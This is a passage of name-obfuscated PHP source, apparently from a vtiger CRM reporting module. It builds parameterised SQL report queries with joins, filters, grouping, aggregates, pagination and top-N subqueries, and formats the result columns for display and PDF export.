0;$Zf5<$ZZT1919;$Zf5++){if(isset($this->ZZZZZZZZZZN1313[$this->ZZZZZZZZZZQ1616[$Zf5]]["vtiger_crmentity"])){if(!isset($this->ZZZZZZZZZZH77[$this->ZZZZZZZZZZQ1616[$Zf5]]["vtiger_crmentity"])){$this->ZZZZZZZZZZZh7($this->ZZZZZZZZZZN1313[$this->ZZZZZZZZZZQ1616[$Zf5]]["vtiger_crmentity"],false,$this->ZZZZZZZZZZQ1616[$Zf5]);} $ZZq16.= "AND (`".$this->ZZZZZZZZZZH77[$this->ZZZZZZZZZZQ1616[$Zf5]]["vtiger_crmentity"]."`.`deleted` = 0 ";$ZZq16.= "OR `".$this->ZZZZZZZZZZH77[$this->ZZZZZZZZZZQ1616[$Zf5]]["vtiger_crmentity"]."`.`deleted` IS NULL) ";}} $ZZq16.=")";return $ZZq16;} function ZZZZZZZZZZZZK1010($ZZZZZZZZZZZZL1111,$includeDetails = false){$ZZS1818 = "";$ZZZZH77 = array();$ZZT1919 = count($ZZZZZZZZZZZZL1111);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){if(isset($this->ZZZZZZZZZZR1717[$ZZZZZZZZZZZZL1111[$Zf5]["name"]]) && isset($ZZZZZZZZZZZZL1111[$Zf5]["sortDirection"]) && isset($ZZZZZZZZZZZZL1111[$Zf5]["sortAction"]) && in_array($ZZZZZZZZZZZZL1111[$Zf5]["sortAction"],array("sort","groupsort"))){$ZZZZH77[] = $this->ZZZZZZZZZZZK1010($this->ZZZZZZZZZZR1717[$ZZZZZZZZZZZZL1111[$Zf5]["name"]],$ZZZZZZZZZZZZL1111[$Zf5],$includeDetails);}} if(!empty($ZZZZH77)){$ZZS1818= " ORDER BY ".implode(" , ",$ZZZZH77);} return $ZZS1818;} function ZZZZZZZZZZZZM1212($module){$ZZS1818 = $this->ZZZZS1818->ZZZZZk10($module->name,$module->name);if($module->relationDescr!==null){$ZZS1818 = $this->ZZZZZZZZZZZZM1212($this->ZZZZZx23[$module->relationDescr->joinModule])."-".$ZZS1818;} return $ZZS1818;} function ZZZZZZZZZZZZN1313($module,$ZZZZZx23,$ZZZZZZZZZZZZD33,$ZZZM1212){$this->ZZZZZx23 = array_merge(array($module),$ZZZZZx23);$this->ZZZZZZZZZZH77 = $this->ZZZZZZZZZZZZF55($this->ZZZZZx23);$this->ZZZZZZZZZZI88 = array();$this->ZZZZZZZZZZT1919 = array();$this->ZZZZZZZZZZV2121 = array();$this->ZZZZZZZZZZK1010 = 0;$this->ZZZZZZZZZZN1313 = $this->ZZZZZZZZZZZZH77($this->ZZZZZx23);$this->ZZZZZZZZZZO1414 = $this->ZZZZZZZZZZZZG66($this->ZZZZZx23);$this->ZZZZZZZZZZQ1616 = array(0);$this->ZZZZZZZZZZU2020 = array();$this->ZZZZZZZZZZR1717 = $this->ZZZZZZZZZZZZE44($this->ZZZZZx23);$this->ZZZZZZZZZZS1818 = $this->ZZZZZZZZZZZZB11($this->ZZZZZZZZZZR1717,$ZZZZZZZZZZZZD33,$ZZZM1212);$this->ZZZZZZZZZZZh7($this->ZZZZZZZZZZO1414[0],true);$ZZT1919 = count($this->ZZZZZx23);if($this->ZZZZZZZZZZL1111 == true){for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$this->ZZZZZZZZZZM1212[$Zf5] = $this->ZZZZZZZZZZZZM1212($this->ZZZZZx23[$Zf5])." ";}}else{for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$this->ZZZZZZZZZZM1212[$Zf5] = "";}}} function ZZZZZZZZZZZZO1414($field,$ZZZZZZZZZZZZP1515,$ZZZZZZZZZZZZQ1616, $ZZZZZZZZZZZq16 = true, $ZZZZZZZZZZZt19 = array()){$ZZZz25 = $this->ZZZZZZZZZZZs18($field,$ZZZZZZZZZZZZP1515,$ZZZZZZZZZZZZQ1616, $ZZZZZZZZZZZq16, $ZZZZZZZZZZZt19);if(!$ZZZz25) {return false;} foreach($ZZZz25["fields"] as $Zu20=>$fieldName){$this->ZZZZZZZZZZT1919[$fieldName] = $ZZZz25["titles"][$Zu20];} $this->ZZZZZZZZZZU2020 = array_merge($this->ZZZZZZZZZZU2020,$ZZZz25["select"]);} function ZZZZZZZZZZZG66($ZZZZZZZZZZZt19){$ZZZZZZZZZZZZR1717 = array("avg" => array("args" => 1, "isExpr" => false, "fn" => "AVG",), "cnt" => array("args" => 1, "isExpr" => false, "fn" => "COUNT",), "min" => array("args" => 1, "isExpr" => false, "fn" => "MIN",), "max" => array("args" => 1, "isExpr" => false, "fn" => "MAX",), "sum" => array("args" => 1, "isExpr" =>false, "fn" => "SUM",), "plus" => array("args" => 2, "isExpr" =>true, "fn" => "+",), "minus" => array("args" => 2, "isExpr" =>true, "fn" => "-",), "mult" => array("args" => 2, "isExpr" =>true, "fn" => "*",), "div" => array("args" => 2, "isExpr" =>true, "fn" => "/",),);$ZZS1818 = "NULL";if(isset($ZZZZZZZZZZZZR1717[$ZZZZZZZZZZZt19["op"]]) && count($ZZZZZZZZZZZt19["val"]) == $ZZZZZZZZZZZZR1717[$ZZZZZZZZZZZt19["op"]]["args"] && count($ZZZZZZZZZZZt19["valType"]) == $ZZZZZZZZZZZZR1717[$ZZZZZZZZZZZt19["op"]]["args"]){$ZZZz25 = array();for($Zf5 = 0;$Zf5<$ZZZZZZZZZZZZR1717[$ZZZZZZZZZZZt19["op"]]["args"];$Zf5++){$ZZZZZZZZZZZZS1818 = "NULL";if(isset($ZZZZZZZZZZZt19["valType"][$Zf5]) && isset($ZZZZZZZZZZZt19["val"][$Zf5])){if($ZZZZZZZZZZZt19["valType"][$Zf5] == "c"){$ZZZZZq16 = str_replace(",",".",$ZZZZZZZZZZZt19["val"][$Zf5]);if(preg_match("/^([0-9]+)(\\.|,)?[0-9]{0,}$/",$ZZZZZq16)){$ZZZZZZZZZZZZS1818 = $ZZZZZq16;}}elseif($ZZZZZZZZZZZt19["valType"][$Zf5] == "f"){if(isset($this->ZZZZZZZZZZR1717[$ZZZZZZZZZZZt19["val"][$Zf5]])){$ZZZZZq16 = $this->ZZZZZZZZZZZs18($this->ZZZZZZZZZZR1717[$ZZZZZZZZZZZt19["val"][$Zf5]],null,null,false,false);$ZZZZZZZZZZZZS1818 = $ZZZZZq16["select"][0];}}elseif($ZZZZZZZZZZZt19["valType"][$Zf5] == "op"){$ZZZZZZZZZZZZS1818 = $this->ZZZZZZZZZZZG66($ZZZZZZZZZZZt19["val"][$Zf5]);}} $ZZZz25[] = $ZZZZZZZZZZZZS1818;} if($ZZZZZZZZZZZZR1717[$ZZZZZZZZZZZt19["op"]]["isExpr"]){$ZZS1818 = "(". implode($ZZZZZZZZZZZZR1717[$ZZZZZZZZZZZt19["op"]]["fn"],$ZZZz25) .")";}else{$ZZS1818 = $ZZZZZZZZZZZZR1717[$ZZZZZZZZZZZt19["op"]]["fn"]."(".implode($ZZZZZZZZZZZZR1717[$ZZZZZZZZZZZt19["op"]]["fn"],$ZZZz25) .")";}} return $ZZS1818;} function ZZZZZZZZZZZZT1919($ZZZc2){$ZZZZZZZZZZZv21 = PlatformConnector::ZZZZZZz25();$ZZT1919 = count($ZZZc2);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZz25 = "ROUND(".$this->ZZZZZZZZZZZG66($ZZZc2[$Zf5]["val"]).", {$ZZZZZZZZZZZv21}) AS `".$ZZZc2[$Zf5]['name']."`";$this->ZZZZZZZZZZU2020[] = $ZZZz25;$this->ZZZZZZZZZZT1919[$ZZZc2[$Zf5]['name']] = $ZZZc2[$Zf5]["title"];}} function ZZZZZZZZZZZZU2020($filters){$ZZT1919 = count($filters);$ZZZx23 = array();$ZZZW2222 = " WHERE (1=1 ";for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZq16 = $this->ZZZZZZZZZZZZz25($filters[$Zf5],$this->ZZZZZZZZZZR1717);$ZZZW2222.= $ZZZZZq16["sql"];if(!empty($ZZZZZq16["params"])){$ZZZx23 = array_merge($ZZZx23,$ZZZZZq16["params"]);}} $this->ZZZZZZZZZZV2121 = $ZZZx23;$ZZZW2222.= ") ".$this->ZZZZZZZZZZZZJ99();return $ZZZW2222;} function ZZZZZZZZZZZZV2121(ZZZZZZZZZZx23 $module,$ZZZZZZZZZZZZD33,$filters,$ZZZZZx23 = array(),$ZZZZZZZZZZZZL1111 = array(),$ZZZH77 = array(),$ZZZZZZZZZZZZW2222 = false, $ZZZM1212 = array(), $ZZZZZZZZZZZZX2323 = array()){$ZZZZZZZZZZZZY2424 = array();$this->ZZZZZZZZZZZZN1313($module,$ZZZZZx23,$ZZZZZZZZZZZZD33,$ZZZM1212);$ZZZG66 = array();if($ZZZZZZZZZZZZW2222 == false){$ZZT1919 = count($this->ZZZZZZZZZZS1818);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){foreach($ZZZZZZZZZZZZL1111 as $ZZZZZZZZZZZZZ2525) {if($this->ZZZZZZZZZZS1818[$Zf5]['fieldname'] == $ZZZZZZZZZZZZZ2525['name']) {if(!empty($ZZZZZZZZZZZZZ2525['dateGrouping'])) {array_push($ZZZZZZZZZZZZY2424, $this->ZZZZZZZZZZS1818[$Zf5]['fieldname']);$this->ZZZZZZZZZZZZO1414($this->ZZZZZZZZZZS1818[$Zf5], null, $ZZZZZZZZZZZZZ2525['dateGrouping']);}}} if(!in_array($this->ZZZZZZZZZZS1818[$Zf5]['fieldname'], $ZZZZZZZZZZZZY2424)) {if($this->ZZZZZZZZZZS1818[$Zf5]['tablename'] !== '__virtual__') {$this->ZZZZZZZZZZZZO1414($this->ZZZZZZZZZZS1818[$Zf5],null,null);}}} $this->ZZZZZZZZZZZZT1919($ZZZM1212);} else{$ZZT1919 = count($ZZZZZZZZZZZZL1111);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){if(isset($this->ZZZZZZZZZZR1717[$ZZZZZZZZZZZZL1111[$Zf5]["name"]])){$ZZZZZZZZZZZZQ1616 = null;if(isset($ZZZZZZZZZZZZL1111[$Zf5]["dateGrouping"]) && isset($this->ZZZZZZZZZZW2222[$ZZZZZZZZZZZZL1111[$Zf5]["dateGrouping"]])){$ZZZZZZZZZZZZQ1616 = $ZZZZZZZZZZZZL1111[$Zf5]["dateGrouping"];} if(isset($ZZZZZZZZZZZZL1111[$Zf5]["sortAction"]) && $ZZZZZZZZZZZZL1111[$Zf5]["sortAction"] =="nogroup"){$ZZZZZZZZZZZZQ1616 = "nogroup";} $this->ZZZZZZZZZZZZO1414($this->ZZZZZZZZZZR1717[$ZZZZZZZZZZZZL1111[$Zf5]["name"]],null,$ZZZZZZZZZZZZQ1616);$ZZZz25 = $this->ZZZZZZZZZZZH77($this->ZZZZZZZZZZR1717[$ZZZZZZZZZZZZL1111[$Zf5]["name"]],$ZZZZZZZZZZZZL1111[$Zf5]);if(!empty($ZZZz25)){$ZZZG66[] = $ZZZz25;}}} $ZZT1919 = count($ZZZH77);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){if(isset($this->ZZZZZZZZZZR1717[$ZZZH77[$Zf5]["selectedField"]])){$this->ZZZZZZZZZZZZO1414($this->ZZZZZZZZZZR1717[$ZZZH77[$Zf5]["selectedField"]],$ZZZH77[$Zf5]["value"],null);} foreach($ZZZM1212 as $ZZZZZZZZZZZt19) {if($ZZZZZZZZZZZt19["name"] == $ZZZH77[$Zf5]["selectedField"]) {$this->ZZZZZZZZZZZZO1414(null, $ZZZH77[$Zf5]["value"], null, true, $ZZZZZZZZZZZt19);}}} $ZZT1919 = count($ZZZZZZZZZZZZL1111);for($Zf5 = 0;$Zf5 < $ZZT1919;$Zf5++){if(isset($ZZZZZZZZZZZZL1111[$Zf5]["dateGrouping"]) && !empty($ZZZZZZZZZZZZL1111[$Zf5]["dateGrouping"])){foreach($this->ZZZZZZZZZZS1818 as &$ZZZZZZZZZZZZZa0) {if($ZZZZZZZZZZZZZa0['fieldname'] == $ZZZZZZZZZZZZL1111[$Zf5]["name"]) {$ZZZZZZZZZZZZZa0['fieldname'] = $ZZZZZZZZZZZZZa0['fieldname'] . "_" . $ZZZZZZZZZZZZL1111[$Zf5]["dateGrouping"];$ZZZZZZZZZZZZZa0['dateGrouping'] = $ZZZZZZZZZZZZL1111[$Zf5]["dateGrouping"];}}}}} $ZZZW2222 = $this->ZZZZZZZZZZZZU2020($filters);$ZZZZH77 = $this->ZZZZZZZZZZZZK1010($ZZZZZZZZZZZZL1111,!$ZZZZZZZZZZZZW2222);$ZZZZy24 = "";if(!empty($ZZZG66)){$ZZZZy24= " GROUP BY ".implode(" , ",$ZZZG66);} if(in_array($this->ZZZZZZZZZZO1414[0]['name'], array('oqc_offering'))) {$ZZZZZZZZZZZZZb1 = $this->ZZZZZZZZZZH77[0][$this->ZZZZZZZZZZO1414[0]['name']];$ZZZW2222 .= " AND `$ZZZZZZZZZZZZZb1`.`is_latest` = 1 ";} $ZZZZZZZZZZN1313 = $this->ZZZZZZZZZZZZZc2($ZZZZZZZZZZZZL1111, $filters, $this->ZZZZZZZZZZO1414[0]['name'], $this->ZZZZZZZZZZI88);$ZZZZZZZZZZZZZd3 = array();foreach($ZZZZZZZZZZZZL1111 as $ZZZZZZZZZZZZZe4) {if(in_array($ZZZZZZZZZZZZZe4['name'], $ZZZZZZZZZZZZZd3)) {continue;} if(isset($ZZZZZZZZZZZZZe4['showTop']) && $ZZZZZZZZZZZZZe4['showTop'] > 0) {$ZZZZZZZZZZZZZd3[] = $ZZZZZZZZZZZZZe4['name'];$this->ZZZZZZZZZZV2121 = array_merge($this->ZZZZZZZZZZV2121, $this->ZZZZZZZZZZV2121);}} $ZZq16 ="SELECT ".implode(" , ",$this->ZZZZZZZZZZU2020);$ZZq16.= " FROM ".$ZZZZZZZZZZN1313['mainTable']. " AS ".$this->ZZZZZZZZZZH77[0][$this->ZZZZZZZZZZO1414[0]['name']];$ZZq16.= " ".implode(" ", $ZZZZZZZZZZN1313['joinTables']);$ZZq16.= $ZZZW2222;$ZZq16.= $ZZZZy24;$ZZq16.= $ZZZZH77;$ZZZZZZZZZZZZZf5 = $this->ZZZZZZZZZZZZZg6($ZZq16, $this->ZZZZZZZZZZV2121, $ZZZZZZZZZZZZX2323);$ZZq16.= $ZZZZZZZZZZZZZf5["sql"];return array("sql" => $ZZq16, "params" => $this->ZZZZZZZZZZV2121, "cols" => $this->ZZZZZZZZZZT1919, "fields" => $this->ZZZZZZZZZZS1818, "meta" => $ZZZZZZZZZZZZZf5["meta"],);} function ZZZZZZZZZZZZZg6($ZZq16, $ZZZx23, $ZZZZZZZZZZZZX2323){$ZZZZZZZZZZZZZf5 = array("meta" => array(), "sql" => '');if(!isset($ZZZZZZZZZZZZX2323["pagination"])) {$ZZZZZZZZZZZZX2323["pagination"] = false;} if(!isset($ZZZZZZZZZZZZX2323['records']) && $ZZZZZZZZZZZZX2323["pagination"]) {$query = 'SELECT COUNT(*) AS `COUNT` FROM ('.$ZZq16.') AS `counterTable`';$ZZn13 = $this->db->ZZZw22($query, $ZZZx23);$ZZZZZZZZZZZZX2323['records'] = (int) $ZZn13[0]['COUNT'];} if(isset($ZZZZZZZZZZZZX2323['records']) && isset($ZZZZZZZZZZZZX2323['limit']) && $ZZZZZZZZZZZZX2323["pagination"]) {$limit = (int) $ZZZZZZZZZZZZX2323['limit'];$ZZZZZZZZZZZZZh7 = 0;if($ZZZZZZZZZZZZX2323['records'] > 0 && $limit > 0) {$ZZZZZZZZZZZZZh7 = (int) ceil($ZZZZZZZZZZZZX2323['records'] / $limit);} $ZZZZZZZZZZZZX2323['pages'] = $ZZZZZZZZZZZZZh7;if(isset($ZZZZZZZZZZZZX2323['currentPage'])) {if($ZZZZZZZZZZZZX2323['currentPage'] > $ZZZZZZZZZZZZX2323['pages']) {$ZZZZZZZZZZZZX2323['currentPage'] = 1;} $ZZZZZZZT1919 = ($ZZZZZZZZZZZZX2323['currentPage'] - 1) * $limit;} else {$ZZZZZZZT1919 = 0;$ZZZZZZZZZZZZX2323['currentPage'] = 1;} $ZZZZZZZZZZZZZf5["sql"] = " LIMIT $ZZZZZZZT1919, $limit";} $ZZZZZZZZZZZZZf5["meta"] = $ZZZZZZZZZZZZX2323;return $ZZZZZZZZZZZZZf5;} function ZZZZZZZZZZZZZi8($ZZZZZZZZZZZZL1111, $filters) {$ZZZZZZZZZZZZZj9 = array('limit' => 0, 'column' => false, 'sortDirection' => 'DESC', 'table' => false, 'tableAlias' => false, 'sql' => '',);if(empty($ZZZZZZZZZZZZL1111)) {return false;} $ZZZZZW2222 = 0;foreach($ZZZZZZZZZZZZL1111 as $ZZZZZZZZZZZZZk10 => $ZZZZZZZZZZZZZl11){if(isset($ZZZZZZZZZZZZZl11['showAggregates'])) {$ZZZZZW2222 = $ZZZZZZZZZZZZZk10;break;}} if(!isset($ZZZZZZZZZZZZL1111[$ZZZZZW2222]['showTop']) || empty($ZZZZZZZZZZZZL1111[$ZZZZZW2222]['showTop'])) {return false;} if($ZZZZZZZZZZZZL1111[$ZZZZZW2222]['showTop'] > 0) {$ZZZZZZZZZZZZZj9['limit'] = $ZZZZZZZZZZZZL1111[$ZZZZZW2222]['showTop'];$ZZZZZZZZZZZZZj9['field'] = $ZZZZZZZZZZZZL1111[$ZZZZZW2222]['name'];$ZZZZZZZZZZZZZj9['aggregate'] = $ZZZZZZZZZZZZL1111[$ZZZZZW2222]['aggregate'];$ZZZZZZZZZZZZZj9['aggregateSortDirection'] = $ZZZZZZZZZZZZL1111[$ZZZZZW2222]['sortDirection'];$ZZZ2525 = $this->ZZZZZZZZZZZZZm12($ZZZZZZZZZZZZL1111[$ZZZZZW2222]['name']);$ZZZZZZZZZZZZZj9 = array_merge($ZZZZZZZZZZZZZj9, $ZZZ2525);if($ZZZZZZZZZZZZZj9['aggregate']) {$ZZZZZZZZZZZZZn13 = false;$ZZZZZZZZZZZZZj9['aggregateTable'] = false;$ZZZZZZZZZZZZZj9['aggregateTableAlias'] = false;$ZZZZZq16 = explode("_", $ZZZZZZZZZZZZZj9['aggregate'], 2);if(in_array($ZZZZZq16[0], array("sum", "avg", "count"))) {$ZZZZZZZZZZZZZn13 = $ZZZZZq16[0];array_shift($ZZZZZq16);$ZZZZZZZZZZZZZo14 = $ZZZZZq16[0];} else {$ZZZZZZZZZZZZZo14 = $ZZZZZZZZZZZZZj9['aggregate'];} $ZZZ2525 = $this->ZZZZZZZZZZZZZm12($ZZZZZZZZZZZZZo14);$ZZZZZZZZZZZZZj9['aggregateType'] = $ZZZZZZZZZZZZZn13;$ZZZZZZZZZZZZZj9['aggregateColumn'] = $ZZZ2525['column'];$ZZZZZZZZZZZZZj9['aggregateTable'] = $ZZZ2525['table'];$ZZZZZZZZZZZZZj9['aggregateTableAlias'] = $ZZZ2525['tableAlias'];$ZZZZZZZZZZZZZj9['aggregateColumn'] = str_replace("#alias#", $ZZZ2525['tableAlias'], $ZZZZZZZZZZZZZj9['aggregateColumn']);} $ZZZZm12 = $ZZZZZZZZZZZZZj9['table'];$ZZZZZZZZZZZZZb1 = $ZZZZZZZZZZZZZj9['tableAlias'];$ZZZZZZZL1111 = $ZZZZZZZZZZZZZj9['column'];$limit = $ZZZZZZZZZZZZZj9['limit'];$aggregateColumn= $ZZZZZZZZZZZZZj9['aggregateColumn'];$ZZZZZZZZZZZZZp15 = $ZZZZZZZZZZZZZj9['aggregateTableAlias'];$ZZZZZZZZZZZZZq16 = $ZZZZZZZZZZZZZj9['aggregateSortDirection'];$ZZZZZZZZZZZZZn13 = $ZZZZZZZZZZZZZj9['aggregateType'];$ZZZZZZZZZZZZZr17 = " `$ZZZZZZZZZZZZZp15`.`$aggregateColumn` ";if($ZZZZZZZZZZZZZn13 && in_array(strtoupper($ZZZZZZZZZZZZZn13), array('SUM', 'COUNT', 'AVG'))) {$ZZZZZZZZZZZZZr17 = " $ZZZZZZZZZZZZZn13($ZZZZZZZZZZZZZr17) ";} $ZZZW2222 = $this->ZZZZZZZZZZZZU2020($filters);$ZZq16 = "SELECT * FROM `".$ZZZZm12."` WHERE `".$ZZZZm12."`.`".$ZZZZZZZL1111."` IN (SELECT * FROM (SELECT `".$ZZZZZZZZZZZZZb1."`.`".$ZZZZZZZL1111."` FROM `".$this->ZZZZZZZZZZO1414[0]['name']."` AS ".$this->ZZZZZZZZZZH77[0][$this->ZZZZZZZZZZO1414[0]['name']]." ".implode("\n", $this->ZZZZZZZZZZI88)." $ZZZW2222 GROUP BY `".$ZZZZZZZZZZZZZb1."`.`".$ZZZZZZZL1111."` ORDER BY $ZZZZZZZZZZZZZr17 ".$ZZZZZZZZZZZZZq16." LIMIT $limit) AS tmp_limit_table) ";$ZZZZZZZZZZZZZj9['sql'] = "($ZZq16)";} return $ZZZZZZZZZZZZZj9;} function ZZZZZZZZZZZZZm12($field) {$r17 = array();foreach($this->ZZZZZZZZZZR1717 as $ZZZZZZZZZZZZZs18) {if ($ZZZZZZZZZZZZZs18['fieldname'] == $field) {$r17['column'] = $ZZZZZZZZZZZZZs18['columnname'];$r17['table'] = $ZZZZZZZZZZZZZs18['tablename'];$r17['tableAlias'] = $this->ZZZZZZZZZZH77[$ZZZZZZZZZZZZZs18['module']][$ZZZZZZZZZZZZZs18['tablename']];break;}} return $r17;} function ZZZZZZZZZZZZZc2($ZZZZZZZZZZZZL1111, $filters, $ZZZZZZZZZZO1414, $ZZZZZZZZZZZZZt19) {$ZZZZZZZZZZZZZj9 = $this->ZZZZZZZZZZZZZi8($ZZZZZZZZZZZZL1111, $filters);if($ZZZZZZZZZZZZZj9) {if($ZZZZZZZZZZO1414 == $ZZZZZZZZZZZZZj9['table']) {$ZZZZZZZZZZO1414 = $ZZZZZZZZZZZZZj9['sql'];} foreach($ZZZZZZZZZZZZZt19 as &$ZZZZZZZZZZZN1313) {$ZZZZZZZZZZZZZu20 = strpos($ZZZZZZZZZZZN1313, $ZZZZZZZZZZZZZj9['table']);if($ZZZZZZZZZZZZZu20) {$ZZZZZZZZZZZN1313 = str_replace("`".$ZZZZZZZZZZZZZj9['table']."`", $ZZZZZZZZZZZZZj9['sql'], $ZZZZZZZZZZZN1313);break;}}} $r17 = array('mainTable' => $ZZZZZZZZZZO1414, 'joinTables' => $ZZZZZZZZZZZZZt19,);return $r17;}} class ZZZZZZZZZZZZZv21{protected $db;protected $ZZZZS1818;protected $ZZZK1010 = array();function __construct(ZZp15 $db, ZZZZT1919 $ZZZZS1818, $ZZZK1010 = array()){$this->db = $db;$this->ZZZZS1818 = $ZZZZS1818;$this->ZZZK1010 = $ZZZK1010;} function translate($Zu20,$ZZZZZZZZZZZZZw22 = false) {if(isset($this->ZZZK1010[$Zu20])) {return $this->ZZZK1010[$Zu20];} return $ZZZZZZZZZZZZZw22;} function ZZZZZZZZZZZZZx23($G66) {$ZZZZZZZZZZZZZy24 = array();foreach($G66 as $Zu20 => $value) {$ZZZZZZZZZZZZZz25 = $this->translate($Zu20);if($ZZZZZZZZZZZZZz25) {$value = $ZZZZZZZZZZZZZz25;} $ZZZZZZZZZZZZZy24[$Zu20] = $value;} return $ZZZZZZZZZZZZZy24;} function ZZZZZZZZZZZZZA00($module,$ZZZV2121,$filters,$ZZZZZx23 = array(),$ZZZG66,$ZZZH77,$ZZZZZZZZZZZZW2222 = false,$isCrosstab = true,$ZZZZZZZZZZZZZB11 = true,$aggregateColumn = false, $dateFormat = "yyyy-mm-dd",$ZZZZZZZZZZZZZC22 = false, $ZZZM1212 = array(), $ZZZZZZZZZZZZX2323 = array(), ARUser $ZZZZZZZZZZZZZD33){$ZZZZZZZZZZZZZE44 = new ZZZZZZZZZZG66($this->db,$this->ZZZZS1818, false, $ZZZZZZZZZZZZZD33);$ZZZZZZZZZZZZZF55 = array();$ZZT1919 = count($ZZZZZx23);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZZZZZZZF55[] = new ZZZZZZZZZZy24($ZZZZZx23[$Zf5]->name,$this->db,$this->ZZZZS1818,$ZZZZZx23[$Zf5]);} $ZZq16 = $ZZZZZZZZZZZZZE44->ZZZZZZZZZZZZV2121($module,$ZZZV2121,$filters,$ZZZZZZZZZZZZZF55,$ZZZG66,$ZZZH77,$ZZZZZZZZZZZZW2222,$ZZZM1212,$ZZZZZZZZZZZZX2323);$this->db->ZZZA00("SET NAMES utf8", array());$ZZS1818 = $this->db->ZZZw22($ZZq16["sql"],$ZZq16["params"]);array_unshift($ZZZZZZZZZZZZZF55,$module);$ZZZZZZZZZZZZZG66 = new ZZZZZZZZZZZZZH77($ZZZG66,$ZZq16["fields"],$ZZZZZZZZZZZZW2222);$ZZZZZZZZZZZZZG66->ZZZZZZZZZZZZZI88($ZZS1818);$ZZZZZZZZZZZZZJ99 = new ZZZZZZZZZZZZZK1010($this->ZZZZS1818,$this->db,$ZZq16["fields"],$ZZZG66,$ZZZZZZZZZZZZZF55,$dateFormat,$ZZZZZZZZZZZZZC22);$ZZZZZZZZZZZZZJ99->ZZZZZZZZZZZZZI88($ZZS1818);$ZZS1818 = array("cols" => $this->ZZZZZZZZZZZZZx23($ZZq16["cols"]), "data" => $ZZS1818);if($isCrosstab && count($ZZS1818["data"])>0){if($aggregateColumn){$ZZZZZZZZZZZZZL1111 = new ZZZZZZZZZZZZZM1212($this->db,$this->ZZZZS1818,$ZZZZZZZZZZZZZF55);}else{$ZZZZZZZZZZZZZL1111 = new ZZZZZZZZZZZZZN1313($this->db,$this->ZZZZS1818,$ZZZZZZZZZZZZZF55);} $ZZS1818 = $ZZZZZZZZZZZZZL1111->ZZZZZZZZZZZZZO1414($ZZS1818,$ZZZG66,$ZZZH77,$ZZq16["fields"]);} $ZZS1818["cols"] = $this->ZZZZZZZZZZZZZx23($ZZS1818["cols"]);if($ZZZZZZZZZZZZZB11){$ZZZZZZZZZZZZZJ99 = new ZZZZZZZZZZZZZP1515();$ZZZZZZZZZZZZZJ99->ZZZZZZZZZZZZZI88($ZZS1818["data"]);} $ZZS1818["meta"] = $ZZq16["meta"];$ZZS1818["pdffields"] = $this->ZZZZZZZZZZZZZQ1616($ZZZZZZZZZZZZZF55, $ZZS1818["cols"], $ZZS1818["data"], $isCrosstab, $aggregateColumn);return $ZZS1818;} function ZZZZZZZZZZZZZQ1616($ZZZZZZZZZZj9, $ZZZZZZZZZZZd3, $r17, $isCrosstab = false, $aggregateColumn = false) {$ZZZZZZZZZZZZZR1717 = array();if(!$aggregateColumn) {$ZZZZZZZZZZZZZS1818 = array();foreach ($ZZZZZZZZZZZd3 as $ZZZZn13 => $title) {$ZZZZZZZZZZZZZT1919 = strstr($ZZZZn13,'_');if(in_array(substr($ZZZZZZZZZZZZZT1919, -4), array('_sum','_min','_max','_cnt'))){if($isCrosstab){$ZZZZZZZZZZZZZT1919 = strstr(ltrim(substr($ZZZZZZZZZZZZZT1919,0,-4),'_'),'_');} else {$ZZZZZZZZZZZZZT1919 = substr($ZZZZZZZZZZZZZT1919,0,-4);}} $ZZZZZZZZZZZZZS1818[$ZZZZn13] = $ZZZZZZZZZZZZZT1919;} foreach ($ZZZZZZZZZZj9 as $module) {$ZZZc2 = $module->ZZZZZZZZZZZZZU2020();foreach ($ZZZc2 as $field) {if(in_array(strstr($field['name'],'_'), $ZZZZZZZZZZZZZS1818)){$ZZZZZZZZZZZZZV2121 = array_keys($ZZZZZZZZZZZZZS1818, strstr($field['name'],'_'));foreach ($ZZZZZZZZZZZZZV2121 as $ZZZZZZZZZZZZZW2222) {$ZZZZZZZZZZZZZR1717[$ZZZZZZZZZZZZZW2222] = $field['type'];}}}}} else {$ZZZZZZZZZZZZZX2323 = array();foreach ($ZZZZZZZZZZj9 as $module) {$ZZZc2 = $module->ZZZZZZZZZZZZZU2020();foreach ($ZZZc2 as $field) {if($field['type'] == 'integer'){$ZZZZZZZZZZZZZX2323[] = $field['name'];}}} $ZZZZZZZZZZZZZY2424 = array();foreach ($this->ZZZK1010 as $Zu20 => $ZZZZZl11) {$ZZZZZZZZZZZr17 = substr($Zu20, -4);if($ZZZZZZZZZZZr17 == '_cnt' || in_array($Zu20, $ZZZZZZZZZZZZZX2323)) {$ZZZZZZZZZZZZZR1717[$ZZZZZl11] = 'integer';} elseif (in_array($ZZZZZZZZZZZr17, array('_sum','_min','_max'))) {foreach ($ZZZZZZZZZZZZZX2323 as $field) {if(strpos($Zu20, $field) !== false){$ZZZZZZZZZZZZZR1717[$ZZZZZl11] = 'integer';}}}}} return $ZZZZZZZZZZZZZR1717;}}
class ZZZZZZZZZZZZZZ2525 extends ZZZZZZZZZZZZZv21{protected $ZZZZZZZZZZZZZZa0 = array();protected $ZZZZZZZZZZZZZZb1 = array();protected $ZZZZZZZZZZZZZZc2 = array();protected $ZZZZZZZZZZZZZZd3 = array();protected $ZZZZZZZZZZZZZZe4 = array();protected $ZZZZZZZZZZZZZZf5 = "";protected $ZZZZZZZZZZZZZZg6 = array();protected $ZZZZZZZZZZZZZZh7 = array();protected $ZZZR1717 = array();function ZZZZZZZZZZZZZZi8($ZZZZZZZZZZj9){$ZZT1919 = count($ZZZZZZZZZZj9);$ZZS1818 = 0;$ZZZZZZZZZZZZZZj9 = array();$ZZZZZZZZZZZZZZk10 = array();for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){if($ZZZZZZZZZZj9[$Zf5]->joinModule == 0){$ZZZZZZZZZZj9[$Zf5]->joinModule = -1;$this->ZZZZZZZZZZZZZZa0[] = $Zf5;$ZZZZZZZZZZZZZZj9[$Zf5+1] = array();$ZZS1818++;} if($ZZZZZZZZZZj9[$Zf5]->joinModule>-1 && 